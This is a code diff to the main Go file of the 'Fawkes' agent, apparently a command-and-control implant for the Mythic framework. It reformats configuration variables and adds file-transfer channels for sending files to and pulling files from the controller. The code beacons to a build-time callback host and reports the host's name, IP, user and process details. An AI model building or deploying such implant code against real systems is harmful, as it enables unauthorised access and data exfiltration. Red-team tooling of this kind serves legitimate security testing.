@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"log"
 	"math/rand"
@@ -15,6 +16,7 @@ import (
 	"github.com/google/uuid"
 
 	"fawkes/pkg/commands"
+	"fawkes/pkg/files"
 	"fawkes/pkg/http"
 	"fawkes/pkg/profiles"
 	"fawkes/pkg/structs"
@@ -22,19 +24,19 @@ import (
 
 var (
 	// These variables are populated at build time by the Go linker
-	payloadUUID        string = ""
-	c2Profile          string = ""
-	callbackHost       string = ""
-	callbackPort       string = "443"
-	userAgent         string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	sleepInterval     string = "10"
-	jitter            string = "10"
-	encryptionKey     string = ""
-	killDate          string = "0"
-	maxRetries        string = "10"
-	debug             string = "false"
-	getURI            string = "/data"
-	postURI           string = "/data"
+	payloadUUID   string = ""
+	c2Profile     string = ""
+	callbackHost  string = ""
+	callbackPort  string = "443"
+	userAgent     string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	sleepInterval string = "10"
+	jitter        string = "10"
+	encryptionKey string = ""
+	killDate      string = "0"
+	maxRetries    string = "10"
+	debug         string = "false"
+	getURI        string = "/data"
+	postURI       string = "/data"
 )
 
 func main() {
@@ -66,20 +68,20 @@ func main() {
 
 	// Initialize the agent
 	agent := &structs.Agent{
-		PayloadUUID:     payloadUUID,
-		Architecture:    "x64",  // This should be set at build time
-		Domain:          "",
-		ExternalIP:      "",
-		Host:            getHostname(),
-		Integrity:       3,
-		InternalIP:      getInternalIP(),
-		OS:              getOperatingSystem(),
-		PID:             os.Getpid(),
-		ProcessName:     os.Args[0],
-		SleepInterval:   sleepIntervalInt,
-		Jitter:         jitterInt,
-		User:           getUsername(),
-		Description:    fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
+		PayloadUUID:   payloadUUID,
+		Architecture:  "x64", // This should be set at build time
+		Domain:        "",
+		ExternalIP:    "",
+		Host:          getHostname(),
+		Integrity:     3,
+		InternalIP:    getInternalIP(),
+		OS:            getOperatingSystem(),
+		PID:           os.Getpid(),
+		ProcessName:   os.Args[0],
+		SleepInterval: sleepIntervalInt,
+		Jitter:        jitterInt,
+		User:          getUsername(),
+		Description:   fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
 	}
 
 	// Initialize HTTP profile
@@ -90,7 +92,7 @@ func main() {
 	} else {
 		callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
 	}
-	
+
 	httpProfile := http.NewHTTPProfile(
 		callbackURL,
 		userAgent,
@@ -108,6 +110,9 @@ func main() {
 
 	// Initialize command handlers
 	commands.Initialize()
+
+	// Initialize file transfer goroutines
+	files.Initialize()
 
 	// Initial checkin
 	log.Printf("[INFO] Starting initial checkin...")
@@ -208,6 +213,16 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent) structs.Respo
 	response := structs.Response{
 		TaskID: task.ID,
 	}
+
+	// Create Job struct with channels for this task
+	job := &structs.Job{
+		Stop:              new(int),
+		SendResponses:     make(chan structs.Response, 10),
+		SendFileToMythic:  files.SendToMythicChannel,
+		GetFileFromMythic: files.GetFromMythicChannel,
+		FileTransfers:     make(map[string]chan json.RawMessage),
+	}
+	task.Job = job
 
 	// Get command handler
 	handler := commands.GetCommand(task.Command)
